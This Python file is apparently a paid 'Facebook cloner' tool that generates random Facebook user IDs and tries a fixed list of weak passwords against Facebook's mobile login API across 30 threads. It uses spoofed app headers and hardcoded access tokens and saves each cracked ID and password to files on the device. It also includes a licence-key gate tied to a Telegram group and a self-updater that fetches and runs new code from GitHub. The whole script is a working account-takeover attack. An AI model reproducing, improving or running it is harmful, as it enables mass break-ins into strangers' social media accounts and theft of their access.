import os
import sys
import time
import uuid
import hashlib
import random
import requests
import subprocess
import urllib.request

from concurrent.futures import ThreadPoolExecutor as tred
from random import randint as rr
from threading import Lock

lock = Lock()
oks = []
loop = 0
UPDATE_URL = "https://raw.githubusercontent.com/NICS404/NICS-FB-CLONING-2026/refs/heads/main/NICS.py"

def banner():
    os.system('clear')

    # Colors
    RESET  = "\033[0m"
    CYAN   = "\033[1;36m"
    PURPLE = "\033[1;35m"
    WHITE  = "\033[1;37m"
    GREEN  = "\033[1;32m"
    GRAY   = "\033[0;37m"

    print(CYAN + "╔" + "═" * 58 + "╗" + RESET)

    print(PURPLE + "║" + RESET + " " * 58 + PURPLE + "║" + RESET)

    logo = [
        " __ _  __  ___  ____ ",
        "(  ( \\(  )/ __)/ ___)",
        "/    / )(( (__ \\___ \\",
        "\\_)__)(__ )\\___)(____/"
    ]

    for line in logo:
        padding = (58 - len(line)) // 2
        print(
            PURPLE + "║" + RESET +
            " " * padding +
            WHITE + line +
            " " * (58 - padding - len(line)) +
            PURPLE + "║" + RESET
        )

    print(PURPLE + "║" + RESET + " " * 58 + PURPLE + "║" + RESET)

    print(CYAN + "╠" + "═" * 58 + "╣" + RESET)

    title = "PAID NICS FB CLONER 2026"
    padding = (58 - len(title)) // 2

    print(
        CYAN + "║" + RESET +
        " " * padding +
        GREEN + title +
        " " * (58 - padding - len(title)) +
        CYAN + "║" + RESET
    )

    print(CYAN + "╠" + "═" * 58 + "╣" + RESET)

    info = "Developer: NicsFixer"
    padding = (58 - len(info)) // 2

    print(
        CYAN + "║" + RESET +
        " " * padding +
        GRAY + info +
        " " * (58 - padding - len(info)) +
        CYAN + "║" + RESET
    )

    print(CYAN + "╚" + "═" * 58 + "╝" + RESET)
    print()

# ---- TELEGRAM LINK ----
TELEGRAM_LINK = "https://t.me/nicsfbcloning2026"


def open_telegram():
    link = TELEGRAM_LINK

    print("\033[1;36m")
    print("╔" + "═" * 58 + "╗")
    print("║" + " " * 16 + "TELEGRAM GROUP" + " " * 28 + "║")
    print("╠" + "═" * 58 + "╣")
    print("║" + " " * 58 + "║")
    print(
        "║   \033[1;37mOpening: \033[1;36m" +
        link +
        "\033[1;36m" +
        " " * max(0, 58 - 13 - len(link)) +
        "║"
    )
    print("║" + " " * 58 + "║")
    print("╚" + "═" * 58 + "╝")
    print("\033[0m")

    try:
        subprocess.run(
            ['xdg-open', link],
            check=True,
            timeout=5
        )
        print("\033[1;32m[+] Telegram group opened\033[0m")

    except (
        FileNotFoundError,
        subprocess.CalledProcessError,
        subprocess.TimeoutExpired
    ):
        try:
            subprocess.run(
                ['termux-open', link],
                check=True,
                timeout=5
            )
            print("\033[1;32m[+] Telegram group opened\033[0m")

        except Exception:
            print("\033[1;31m[!] Could not open automatically.\033[0m")
            print("\033[1;33m[*] Open this link manually:\033[0m")
            print("\033[1;36m" + link + "\033[0m")


# ---- APPROVAL ----
def get_machine_key():
    raw = os.getlogin() + str(os.getuid()) + "NICS2026"

    return "NICS-" + hashlib.md5(
        raw.encode()
    ).hexdigest().upper()[:12]


def check_approval(key):
    url = (
        "https://raw.githubusercontent.com/"
        "NICS404/NICS-FB-CLONING-2026/"
        "refs/heads/main/approval.txt"
    )

    try:
        resp = requests.get(url, timeout=10)

        if resp.status_code == 200:
            keys = [
                k.strip()
                for k in resp.text.strip().splitlines()
            ]

            return key in keys

        return False

    except requests.RequestException:
        return False


def approval_flow():
    banner()

    key = get_machine_key()

    print("\033[1;36m")
    print("╔" + "═" * 58 + "╗")
    print("║" + " " * 19 + "ACCESS APPROVAL" + " " * 24 + "║")
    print("╠" + "═" * 58 + "╣")
    print("║" + " " * 58 + "║")

    key_text = "YOUR UNIQUE KEY: " + key
    print(
        "║  \033[1;37m" +
        key_text +
        " " * max(0, 56 - len(key_text)) +
        "\033[1;36m║"
    )

    print("║" + " " * 58 + "║")
    print("╠" + "═" * 58 + "╣")

    print(
        "║   \033[1;36m[A]\033[1;37m OPEN TELEGRAM GROUP" +
        " " * 29 +
        "\033[1;36m║"
    )

    print(
        "║   \033[1;32m[B]\033[1;37m CHECK APPROVAL" +
        " " * 35 +
        "\033[1;36m║"
    )

    print("║" + " " * 58 + "║")
    print("╚" + "═" * 58 + "╝")
    print("\033[0m")

    choice = input(
        "\033[1;37mCHOOSE [A/B]: \033[0m"
    ).strip().upper()

    if choice == "A":
        open_telegram()
        time.sleep(2)
        return approval_flow()

    elif choice == "B":
        if check_approval(key):
            print()
            print("\033[1;32m╔" + "═" * 58 + "╗")
            print(
                "║   APPROVED. ACCESS GRANTED." +
                " " * 30 +
                "║"
            )
            print("\033[1;32m╚" + "═" * 58 + "╝\033[0m")

            time.sleep(1)
            return True

        print()
        print("\033[1;31m[!] NOT APPROVED\033[0m")
        print("\033[1;33m[*] Contact the administrator.\033[0m")
        print("\033[1;33m[*] Make sure your key is approved.\033[0m")

        time.sleep(3)
        return approval_flow()

    else:
        print("\033[1;31m[!] Invalid option.\033[0m")
        time.sleep(1)
        return approval_flow()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')):
            return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002','100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005','100006')):
            return '2013'
        if uid.startswith(('100007','100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007','10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return ''
    elif len(uid) in (9,10):
        return '2008'
    elif len(uid)==8:
        return '2007'
    elif len(uid)==7:
        return '2006'
    elif len(uid)==14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def login_1(uid):
    global loop, oks
    session = requests.session()
    try:
        with lock:
            sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mCHDS-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
            sys.stdout.flush()
        for pw in ('123456','1234567','12345678','123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                with lock:
                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mCHDS\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/CHDS-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                break
        with lock:
            loop += 1
    except:
        time.sleep(5)

def login_2(uid):
    global loop, oks
    with lock:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mCHDS-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
    for pw in ('123456','123123','1234567','12345678','123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)),
                    'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    with lock:
                        print(f"\r\r\x1b[1;37m\x1b[38;5;196m<\x1b[38;5;196m(\x1b[1;37mCHDS\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                        open('/sdcard/CHDS-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                        oks.append(uid)
                    break
        except:
            pass
    with lock:
        loop += 1

def old_clone():
    banner()

    print("\033[1;36m╔" + "═" * 58 + "╗\033[0m")
    print("\033[1;36m║\033[1;37m" + " " * 18 + "OLD SERIES" + " " * 30 + "\033[1;36m║\033[0m")
    print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")

    print("\033[1;36m║   \033[1;37m[A]\033[0m \033[1;32mALL SERIES\033[1;36m" + " " * 39 + "║\033[0m")
    print("\033[1;36m║   \033[1;37m[B]\033[0m \033[1;32m100003/4 SERIES\033[1;36m" + " " * 33 + "║\033[0m")
    print("\033[1;36m║   \033[1;37m[C]\033[0m \033[1;32m2009 SERIES\033[1;36m" + " " * 38 + "║\033[0m")
    print("\033[1;36m║   \033[1;37m[X]\033[0m \033[1;31mBACK\033[1;36m" + " " * 43 + "║\033[0m")

    print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")
    print("\033[1;36m║\033[0m  \033[1;37mSelect a series to continue.\033[0m" + " " * 24 + "\033[1;36m║\033[0m")
    print("\033[1;36m╚" + "═" * 58 + "╝\033[0m")

    choice = input("\033[1;37m\nCHOOSE [A/B/C/X]: \033[0m").strip().upper()

    if choice == "A":
        old_One()

    elif choice == "B":
        old_Tow()

    elif choice == "C":
        old_Tree()

    elif choice == "X":
        return

    else:
        print("\033[1;31m[!] Invalid option.\033[0m")
        time.sleep(1)
        old_clone()

def old_One():
    banner()
    print("       \033[1;32mOLD CODE 2010-2014")
    limit = input("TOTAL ID COUNT: ")
    star = '10000'
    user = []
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(data)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tow():
    banner()
    limit = input("TOTAL ID COUNT: ")
    user = []
    for _ in range(int(limit)):
        prefix = random.choice(['100003','100004'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix+suffix)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tree():
    banner()
    limit = input("TOTAL ID COUNT: ")
    user = []
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append('1000004'+suffix)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def update_script():
    print("\033[1;36m\n[•] Checking for update...\033[0m")

    script_path = os.path.abspath(__file__)
    temp_path = script_path + ".update"

    try:
        urllib.request.urlretrieve(UPDATE_URL, temp_path)

        if not os.path.exists(temp_path):
            print("\033[1;31m[!] Update failed.\033[0m")
            return

        if os.path.getsize(temp_path) < 100:
            os.remove(temp_path)
            print("\033[1;31m[!] Invalid update file.\033[0m")
            return

        os.replace(temp_path, script_path)

        print("\033[1;32m[+] Update successful!\033[0m")
        print("\033[1;37m[*] Restarting...\033[0m")

        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)

        print(f"\033[1;31m[!] Update failed: {e}\033[0m")

def main_menu():
    if approval_flow():
        while True:
            banner()

            print("\033[1;36m╔" + "═" * 58 + "╗\033[0m")
            print(
                "\033[1;36m║\033[1;37m" +
                " " * 21 +
                "MAIN MENU" +
                " " * 28 +
                "\033[1;36m║\033[0m"
            )
            print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")

            print(
                "\033[1;36m║   \033[1;37m[1]\033[0m "
                "\033[1;32mOLD CLONING\033[0m" +
                " " * 38 +
                "\033[1;36m║\033[0m"
            )

            print(
                "\033[1;36m║   \033[1;37m[2]\033[0m "
                "\033[1;36mUPDATE\033[0m" +
                " " * 43 +
                "\033[1;36m║\033[0m"
            )

            print(
                "\033[1;36m║   \033[1;37m[3]\033[0m "
                "\033[1;31mEXIT\033[0m" +
                " " * 45 +
                "\033[1;36m║\033[0m"
            )

            print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")
            print(
                "\033[1;36m║\033[1;37m  Select an option to continue." +
                " " * 26 +
                "\033[1;36m║\033[0m"
            )
            print("\033[1;36m╚" + "═" * 58 + "╝\033[0m")

            ch = input(
                "\033[1;37m\nCHOOSE [1/2/3]: \033[0m"
            ).strip()

            if ch == '1':
                old_clone()

            elif ch == '2':
                update_script()

            elif ch == '3':
                print("\033[1;31m\n[!] Exiting...\033[0m")
                sys.exit(0)

            else:
                print("\033[1;31m[!] Invalid option.\033[0m")
                time.sleep(1)


if __name__ == '__main__':
    main_menu()
